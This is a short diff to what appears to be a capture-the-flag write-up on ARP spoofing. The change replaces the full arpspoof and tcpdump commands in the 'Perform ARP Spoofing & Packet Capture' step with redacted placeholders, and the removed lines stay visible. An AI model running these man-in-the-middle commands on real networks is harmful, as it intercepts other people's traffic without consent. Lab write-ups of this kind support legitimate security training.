@@ -48,11 +48,11 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 ### 3. Perform ARP Spoofing & Packet Capture
 Use `arpspoof` to trick the victim into sending traffic through the attacker:
 ```bash
-arpspoof -i eth0 -t <Victim-IP> <Server-IP>
+arpspoof [...]
 ```
 Capture packets using `tcpdump`:
 ```bash
-tcpdump -i eth0 -A
+tcpdump [...]
 ```
 
 ### 4. Extract the Flag
